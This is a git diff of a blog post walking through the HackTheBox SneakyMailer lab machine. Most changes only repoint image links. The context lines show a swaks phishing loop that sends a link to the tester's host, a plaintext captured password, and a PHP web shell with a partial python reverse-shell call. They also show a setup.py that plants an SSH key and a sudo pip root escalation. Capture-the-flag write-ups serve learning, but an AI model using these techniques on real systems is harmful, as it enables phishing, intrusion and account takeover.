@@ -1,6 +1,6 @@
 ---
 layout: post
-title: HackTheBox Buff walktthrough
+title: HackTheBox SneakyMailer walktthrough
 subtitle: Find the clicker
 gh-repo: c00rni/c00rni.github.io
 gh-badge: [star, fork, follow]
@@ -8,33 +8,31 @@ tags: [enumeration, hackthebox, ssh, pypi, smtp, linux]
 comments: true
 ---
 
-# HackTheBox SneakyMailer walkthrought
 
-
-![info_card.png](_resources/7868506449fe4aaa86c8dfddc6a0e7df.png)
+![info_card.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/7868506449fe4aaa86c8dfddc6a0e7df.png)
 
 
 SneakyMailer is a HackTheBox machine with the ip address 10.10.10.197. It's a Linux machine rated as medium by the community. As you probably already guessed this box, has something to do with mail. I enumerate and created a custom script to get a foothold on the machine. The server runs a Pypi server which allowed me to get a user account and the privilege escalation was pretty straight forward because the user can execute some vulnerable commands as root.
 
 Like always I start by port scanning.
 
-![full_tcp_scan.png](_resources/92c4f703790b407faac306b319296997.png)
+![full_tcp_scan.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/92c4f703790b407faac306b319296997.png)
 
 
 
-![detail_tcp_scan.png](_resources/58ac54cc881f4a5bb52686c167eaeb2c.png)
+![detail_tcp_scan.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/58ac54cc881f4a5bb52686c167eaeb2c.png)
 
 According to the scans the box is  highly likely to be a Debian machine. Several ports were opened. I started to enumerate the webservers for low-hanging fruits. The principal webserver (`10.10.10.197:80`) redirect to `http://sneakycorp.htb`. I modified my hosts.txt file so my operation system doesn't have to request a DNS for the domain name resolution.
 
 
 
-![hostsV1.png](_resources/884f96a52e314b2f8e8093fc1004f100.png)
+![hostsV1.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/884f96a52e314b2f8e8093fc1004f100.png)
 
 
 After going to the website (http://sneakycorp.htb) I found the names, and email addresses of some of the employees.
 
 
-![team_webpage.png](_resources/a43946231f9b47ceb2b907dab108c9c8.png)
+![team_webpage.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/a43946231f9b47ceb2b907dab108c9c8.png)
 
 Created a wordlist of all the emails with common command lines tools. This task could also have been done with [cewl](https://tools.kali.org/password-attacks/cewl)
 
@@ -50,7 +48,7 @@ From there I spent a lot of time enumerating the website and other running servi
 cat mail_list.txt | while read mail;do swaks --server 10.10.10.197 --to $mail --from evil@sneakymailer.htb --header "Error with your login" --body "Hello, please check this website http://10.10.14.9:8000";done
 ```
 
-![mail_response.png](_resources/8b58fa1e11f74b4fb3cb8aa92d3c71d5.png)
+![mail_response.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/8b58fa1e11f74b4fb3cb8aa92d3c71d5.png)
 
 The data from the response of the user was urlencode but they can be easily decode with online tools. I past the parameters in a burp suite panel and get the credentials with `CRTL+SHIFT+U` shortcuts.
 
@@ -66,14 +64,14 @@ I used evolution email client to connect to the mail server as Paul. He has sent
 
 
 
-![password_reset_mail.png](_resources/9bb834cf2b324cce84e14d77378c9161.png)
+![password_reset_mail.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/9bb834cf2b324cce84e14d77378c9161.png)
 
 
 I failed to SSH with developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C credentials but successfully logged into FTP. Developer has access to `dev` directory and could upload php files. I modified my hosts file again and add the subdomain `dev.sneeakycorp`.
 
 
 
-![hostsV2.png](_resources/d72cde4d60e14d1ca7081b25c22c0336.png)
+![hostsV2.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/d72cde4d60e14d1ca7081b25c22c0336.png)
 
 Created PHP script which took one parameter and executed as a command line.
 ```php
@@ -88,24 +86,24 @@ http://dev.sneakycorp.htb/shell.php?cmd=/usr/bin/python -c 'import socket,subpro
 
 
 
-![foothold_shell.png](_resources/3547417d933749f0ad9fef5ed7b674e5.png)
+![foothold_shell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/3547417d933749f0ad9fef5ed7b674e5.png)
 
 
 Now that I was www-data user, I started to enumerate the machine and got the subdomain `pypi.sneakycorp.htb`. I modified  my hosts file again and got to the site but didn't get anything because I was redirected to sneakycorp.htb. I remembered from the beginning of the enumeration that the server had 2 webservers running. The second one running on port 8080.
 
 
-![pypi_subdomaine.png](_resources/4904889adcc4483d8ebc5890b739f80d.png)
+![pypi_subdomaine.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/4904889adcc4483d8ebc5890b739f80d.png)
 
 
 From there I knew how to get access to higher privileged accounts. I knew from previous enumerations that pypi was the user who runs pypiserver and low user was running the python installation module .
 
 
-![ps_result.png](_resources/2c1acf17a2a74add9cc75bc33fbffab4.png)
+![ps_result.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/2c1acf17a2a74add9cc75bc33fbffab4.png)
 
 The root directory of www-data contained a `.htpasswd` file. I found the clair text of the hash with john.
 
 
-![pypi_creds.png](_resources/def382be16f54c4381dedcace2956941.png)
+![pypi_creds.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/def382be16f54c4381dedcace2956941.png)
 
 
 Now I had everything except the package to upload. The python community has a very good [documentation](https://packaging.python.org/tutorials/packaging-projects/) to create packages. But you can follow the step below.
@@ -135,7 +133,7 @@ We know the installation module will be executed with low user rights. One of th
 
 
 
-![generate_ssh_keys.png](_resources/59208d506be5461abcfc16d23a461fa1.png)
+![generate_ssh_keys.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/59208d506be5461abcfc16d23a461fa1.png)
 
 
 Created `setup.py` on the server in the same directory as `.pypirc` and executed it.
@@ -168,11 +166,11 @@ python3 setup.py sdist register -r local upload -r local
 
 Used my private key with ssh and logged as low.
 
-![low_sell.png](_resources/840842eb48374a1a8bbb40408619d8cf.png)
+![low_sell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/840842eb48374a1a8bbb40408619d8cf.png)
 
 The first thing I did after I got low user were to check if I got sudoers rights.
 
-![sudo_right.png](_resources/37f1f2d3043f48508601778871f9049e.png)
+![sudo_right.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/37f1f2d3043f48508601778871f9049e.png)
 
 Run in a privilege context pip can be used to access the file system, escalate users privileges (see [GTFObins](https://gtfobins.github.io/gtfobins/pip/#sudo)).
 
@@ -184,7 +182,7 @@ sudo pip3 install $TF
 
 
 
-![root_sell.png](_resources/fd94916a739340d0b5ae14c6d316714f.png)
+![root_sell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/fd94916a739340d0b5ae14c6d316714f.png)
 
 
 This is how is rooted SneakyMailer machine. I got stuck multiple time on this machine but learn stuff on the way. Thanks for reading this walkthrough.
